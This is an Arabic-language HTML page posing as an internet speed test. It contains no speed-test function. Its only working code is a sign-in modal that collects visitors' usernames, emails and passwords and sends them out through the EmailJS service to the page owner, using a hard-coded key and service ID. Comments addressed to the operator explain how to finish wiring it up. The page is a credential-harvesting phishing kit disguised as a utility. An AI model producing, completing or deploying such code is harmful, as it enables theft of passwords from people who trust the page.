<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أداة قياس سرعة الإنترنت</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // هذا هو المفتاح العام الخاص بك من الصورة التي رفعتها
            emailjs.init("GsGLLEalgTPTM7fB4"); 
        })();
    </script>
    <style>
        /* التنسيقات الخاصة بك */
        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: #111; border: 1px solid #333; border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; text-align: center; }
        .auth-btn { background: #fff; color: #000; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
        #loginModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
        .modal-box { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #444; width: 90%; max-width: 400px; }
        .modal-box input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; }
        .btn-submit { width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="container">
        <h1>قياس سرعة الإنترنت</h1>
        <button class="auth-btn" onclick="toggleModal(true)">تسجيل الدخول للبدء</button>
    </div>

    <div id="loginModal">
        <div class="modal-box">
            <h2>تسجيل حساب جديد</h2>
            <form id="authForm">
                <input type="text" id="username" placeholder="اسم المستخدم" required>
                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
                <input type="password" id="user_code" placeholder="كلمة المرور" required>
                <button type="submit" id="sendBtn" class="btn-submit">إرسال البيانات</button>
                <button type="button" onclick="toggleModal(false)" style="background:none; border:none; color:#888; margin-top:10px; cursor:pointer;">إلغاء</button>
            </form>
        </div>
    </div>

    <script>
        function toggleModal(show) {
            document.getElementById('loginModal').style.display = show ? 'flex' : 'none';
        }

        document.getElementById('authForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const btn = document.getElementById('sendBtn');
            btn.innerText = 'جاري الإرسال...';
            btn.disabled = true;

            // تجهيز البيانات للإرسال
            const params = {
                username: document.getElementById('username').value,
                email: document.getElementById('email').value,
                user_code: document.getElementById('user_code').value
            };

            // معرف الخدمة الخاص بك من الصورة: service_st0ga9g
            // ملاحظة: يجب أن تضع الـ Template ID الصحيح في الخانة الثانية
            emailjs.send("service_st0ga9g", "اكتب_هنا_الـ_Template_ID", params)
                .then(function() {
                    alert('✅ تم الإرسال بنجاح! تفقد بريدك الإلكتروني.');
                    toggleModal(false);
                    document.getElementById('authForm').reset();
                }, function(error) {
                    alert('❌ فشل الإرسال: ' + JSON.stringify(error));
                })
                .finally(() => {
                    btn.innerText = 'إرسال البيانات';
                    btn.disabled = false;
                });
        });
    </script>
</body>
</html>
